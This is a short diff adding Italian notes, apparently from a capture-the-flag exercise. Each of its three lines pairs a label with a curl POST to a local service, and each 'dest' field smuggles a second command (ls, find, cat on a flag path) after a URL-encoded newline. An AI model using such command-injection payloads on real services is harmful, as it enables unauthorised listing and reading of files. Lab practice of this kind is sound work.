@@ -1,0 +1,3 @@
+singole cartelle          curl "http://127.0.0.1:8090" -X POST --data "dest=127.0.0.10%0als there"
+tutte le sottocartelle    curl "http://127.0.0.1:8090" -X POST --data "dest=127.0.0.10%0afind"
+cat di piu cartelle       curl "http://127.0.0.1:8090" -X POST --data "dest=127.0.0.10%0acat<there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/ seriously/though/here/is/the/flag"
